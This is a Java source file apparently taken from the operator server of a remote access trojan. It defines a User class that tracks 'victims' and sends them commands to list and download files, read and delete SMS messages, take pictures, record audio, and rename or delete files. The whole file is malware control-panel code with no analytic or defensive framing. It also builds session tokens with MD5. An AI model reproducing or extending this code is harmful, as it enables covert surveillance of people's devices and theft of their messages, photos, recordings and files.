import io.netty.channel.ChannelHandlerContext;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.net.SocketAddress;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

public class User {

    private ChannelHandlerContext context;
    private String token;
    private JSONObject dbData;

    public User(ChannelHandlerContext context, JSONObject dbData) {
        this.context = context;
        this.dbData = dbData;
        String login = (String) dbData.get("login");
        String password = (String) dbData.get("password");
        this.token = getHash(login + password + Config.SECRET_KEY);
    }

    public void disconnect() {
        context.disconnect();
    }

    private void sendMessage(JSONObject message) {
        SocketAddress address = context.channel().remoteAddress();
        System.out.println(dbData.get("login") + " ("+ address + ") << " + message);
        context.writeAndFlush(message);
    }

    public JSONObject getDbData() {
        return dbData;
    }

    public String getLogin() {
        return (String) dbData.get("login");
    }

    public ArrayList<String> getVictims() {
        return (ArrayList<String>) dbData.get("victims");
    }

    public String getToken() {
        return token;
    }

    public boolean isValidToken(String token) {
        return token != null && token.equals(this.token);
    }

    private String getHash(String str) {
        str += Config.SECRET_KEY;
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        md.update(str.getBytes());

        byte[] dataBytes = md.digest();

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < dataBytes.length; i++) {
            sb.append(Integer.toString((dataBytes[i] & 0xff) + 0x100, 16).substring(1));
        }

        return sb.toString();
    }

    public void sendGetFiles(JSONArray files, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "get.files");
        query.put("files", files);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendAuthUser() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.user");
        query.put("token", token);
        sendMessage(query);
    }

    public void sendErrorCode(String errorCode) {
        JSONObject query = new JSONObject();
        query.put("errorCode", errorCode);
        sendMessage(query);
    }

    public void sendGetVictims(JSONArray victims) {
        JSONObject query = new JSONObject();
        query.put("action", "get.victims");
        query.put("victims", victims);
        sendMessage(query);
    }

    public void sendDeleteFile(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendRenameFile(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendMakeDir(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendGetFileInfo(JSONObject info, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.info");
        query.put("info", info);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendCopyFile(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendSetVictimName(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "set.victim.name");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendSetLoginIps(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "set.login.ips");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendGetSms(JSONArray sms, String type, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "get.sms");
        query.put("sms", sms);
        query.put("type", type);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendDeleteSms(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.sms");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendTakePicture(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "take.picture");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendStartAudioRecord(String code, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "start.audio.record");
        query.put("code", code);
        query.put("victim", victim);
        sendMessage(query);
    }

    public void sendDownloadFile(String filename, long port, String victim) {
        JSONObject query = new JSONObject();
        query.put("action", "download.file");
        query.put("filename", filename);
        query.put("port", port);
        query.put("victim", victim);
        sendMessage(query);
    }

}
